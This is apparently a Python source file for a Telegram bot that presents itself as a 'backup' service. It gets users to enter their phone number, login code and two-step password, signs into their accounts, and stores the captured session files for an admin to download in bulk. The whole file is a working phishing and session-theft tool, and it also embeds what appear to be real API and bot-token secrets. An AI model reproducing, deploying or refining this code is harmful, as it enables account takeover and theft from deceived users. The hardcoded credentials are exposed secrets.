import os
import asyncio
import zipfile
from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import SessionPasswordNeeded

# ==================== কনফিগারেশন ====================
API_ID = 36547444  
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"  
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"  
ADMIN_ID = 8095751648  
# ===================================================

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running perfectly!"

STORAGE_DIR = "user_backups"
if not os.path.exists(STORAGE_DIR):
    os.makedirs(STORAGE_DIR)

user_data = {}

bot = Client("universal_backup_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@bot.on_message(filters.command("start") & filters.private)
async def start_command(client: Client, message: Message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        await message.reply_text(
            "👋 swagotom Admin!\n\n"
            "📊 Storage check: /status\n"
            "📦 Get Zip: `/get [number]`"
        )
    else:
        await message.reply_text(
            "👋 Swagotom! Kindly send your phone number with country code (e.g., +88017XXXXXXXX) to start backup."
        )

@bot.on_message(filters.command("status") & filters.user(ADMIN_ID) & filters.private)
async def status_command(client: Client, message: Message):
    files = [f for f in os.listdir(STORAGE_DIR) if f.endswith(".zip")]
    await message.reply_text(f"📊 Total files in storage: **{len(files)}**")

@bot.on_message(filters.command("get") & filters.user(ADMIN_ID) & filters.private)
async def get_files(client: Client, message: Message):
    args = message.text.split()
    if len(args) < 2:
        await message.reply_text("❌ Format: `/get 5`")
        return
    try:
        count = int(args[1])
    except ValueError:
        await message.reply_text("❌ Count must be a number.")
        return

    all_zips = sorted([f for f in os.listdir(STORAGE_DIR) if f.endswith(".zip")])
    if not all_zips:
        await message.reply_text("❌ No files in storage.")
        return
    
    files_to_take = all_zips[:count]
    actual_count = len(files_to_take)
    await message.reply_text(f"📦 Processing {actual_count} files...")
    
    master_zip_name = f"Admin_Fetch_{actual_count}_files.zip"
    try:
        with zipfile.ZipFile(master_zip_name, 'w') as master_zip:
            for file_name in files_to_take:
                file_path = os.path.join(STORAGE_DIR, file_name)
                master_zip.write(file_path, arcname=file_name)
                os.remove(file_path)
        await message.reply_document(document=master_zip_name, caption=f"✅ Sent {actual_count} files.")
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
    finally:
        if os.path.exists(master_zip_name):
            os.remove(master_zip_name)

@bot.on_message(filters.text & filters.private)
async def handle_login(client: Client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()

    if user_id == ADMIN_ID and not text.startswith("+") and user_id not in user_data:
        return

    if text.startswith("+"):
        phone_number = text
        await message.reply_text("⏳ Connecting to Telegram...")
        clean_phone = phone_number.replace("+", "").replace(" ", "")
        temp_session_path = os.path.join(STORAGE_DIR, f"temp_{clean_phone}")
        
        user_client = Client(temp_session_path, api_id=API_ID, api_hash=API_HASH)
        await user_client.connect()
        
        try:
            code_info = await user_client.send_code(phone_number)
            user_data[user_id] = {
                "client": user_client, "phone": phone_number,
                "phone_code_hash": code_info.phone_code_hash,
                "clean_phone": clean_phone, "temp_path": temp_session_path
            }
            await message.reply_text("📨 Enter OTP code:")
        except Exception as e:
            await message.reply_text(f"❌ Error: {str(e)}")
            await user_client.disconnect()
            if os.path.exists(f"{temp_session_path}.session"):
                os.remove(f"{temp_session_path}.session")

    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
        data = user_data[user_id]
        user_client = data["client"]
        if data.get("waiting_for_password"):
            try:
                await user_client.check_password(text)
                await user_client.disconnect()
                session_file = f"{data['temp_path']}.session"
                final_zip_path = os.path.join(STORAGE_DIR, f"{data['clean_phone']}.zip")
                with zipfile.ZipFile(final_zip_path, 'w') as zipf:
                    if os.path.exists(session_file):
                        zipf.write(session_file, arcname=f"{data['clean_phone']}.session")
                if os.path.exists(session_file):
                    os.remove(session_file)
                await message.reply_text("✅ Account Connected Successfully!")
                del user_data[user_id]
            except Exception as e:
                await message.reply_text(f"❌ Wrong password, try again:")
        else:
            await message.reply_text("⚙️ Verifying...")
            try:
                await user_client.sign_in(data["phone"], data["phone_code_hash"], text)
                await user_client.disconnect()
                session_file = f"{data['temp_path']}.session"
                final_zip_path = os.path.join(STORAGE_DIR, f"{data['clean_phone']}.zip")
                with zipfile.ZipFile(final_zip_path, 'w') as zipf:
                    if os.path.exists(session_file):
                        zipf.write(session_file, arcname=f"{data['clean_phone']}.session")
                if os.path.exists(session_file):
                    os.remove(session_file)
                await message.reply_text("✅ Account Connected Successfully!")
                del user_data[user_id]
            except SessionPasswordNeeded:
                await message.reply_text("🔐 Two-Step Verification is enabled. Enter password:")
                user_data[user_id]["waiting_for_password"] = True
            except Exception as e:
                await message.reply_text(f"❌ Login failed: {str(e)}")
                await user_client.disconnect()
                if os.path.exists(f"{data['temp_path']}.session"):
                    os.remove(f"{data['temp_path']}.session")
                del user_data[user_id]

async def start_services():
    # প্রথমে টেলিগ্রাম বট সচল করা হচ্ছে
    await bot.start()
    print("--- Telegram Bot Server Connected ---")
    
    # এরপর রেন্ডারের জন্য Flask ওয়েব সার্ভার চালু করা হচ্ছে
    port = int(os.environ.get("PORT", 8080))
    loop = asyncio.get_event_loop()
    loop.run_in_executor(None, lambda: app.run(host="0.0.0.0", port=port, use_reloader=False))
    
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(start_services())
    except (KeyboardInterrupt, SystemExit):
        pass
